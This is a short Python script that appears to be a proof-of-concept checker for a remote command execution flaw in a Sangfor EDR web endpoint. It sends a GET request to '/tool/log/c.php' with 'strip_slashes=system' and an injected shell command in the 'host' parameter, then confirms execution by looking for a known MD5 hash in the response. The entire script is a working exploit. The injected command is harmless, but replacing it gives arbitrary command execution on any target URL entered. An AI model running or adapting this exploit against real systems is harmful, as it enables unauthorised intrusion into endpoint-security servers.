# -*- coding: utf-8 -*-
import requests
import re

result={'status' :False}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0"
}
target = input("url")

if not target.endswith('/'):
    target = target + "/"
payload = 'echo -n "sangforEdrRce"|md5sum'
url = target + "/tool/log/c.php?strip_slashes=system&host=" + payload
try:
    req = requests.get(url,headers=headers,timeout=8,verify=False,allow_redirects=False)
    text = req.text
    if 'b7d0f0aad781a9a14af1689df693c1b9' in text :
        result['status'] = True
        result['target'] = url
        result['method'] = 'GET'
        result['response'] = 'b7d0f0aad781a9a14af1689df693c1b9'
except Exception as e:
    result['info'] = str(e)

print(result)
